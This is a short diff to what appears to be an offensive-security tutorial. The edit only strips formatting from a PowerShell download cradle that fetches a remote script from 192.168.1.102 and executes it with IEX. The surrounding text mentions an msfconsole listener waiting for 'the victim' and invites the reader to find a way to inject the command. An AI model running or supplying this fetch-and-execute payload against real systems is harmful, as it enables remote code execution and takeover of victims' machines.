@@ -51,7 +51,7 @@ We will need to start up the listener with *msfconsole* to catch anything that c
 
 Now we just wait for the victim to issue the command:
         
-        *(New-Object system.net.webclient).downloadstring('http://192.168.1.102/download_cradle.ps1') | IEX*
+        (New-Object system.net.webclient).downloadstring('http://192.168.1.102/download_cradle.ps1') | IEX
 
 Your job to find a way for injecting this command :)
 
